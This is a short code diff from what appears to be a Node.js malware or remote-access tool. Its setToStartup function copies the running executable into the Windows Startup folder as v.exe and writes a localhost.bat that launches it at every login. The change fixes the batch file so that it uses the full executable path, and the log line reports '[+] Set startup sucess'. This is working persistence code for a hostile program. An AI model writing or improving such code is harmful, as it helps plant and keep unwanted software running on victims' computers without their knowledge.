@@ -44,7 +44,7 @@ function setToStartup(){
   const Fpath = process.argv[0]
   const startPth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
   const startExePth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"
-  fs.writeFileSync(startPth, "START v.exe");
+  fs.writeFileSync(startPth, "START "+startExePth );
   let dataF = fs.readFileSync(Fpath, {encoding: null});
   fs.writeFileSync(startExePth, dataF)
   console.log("[+] Set startup sucess")
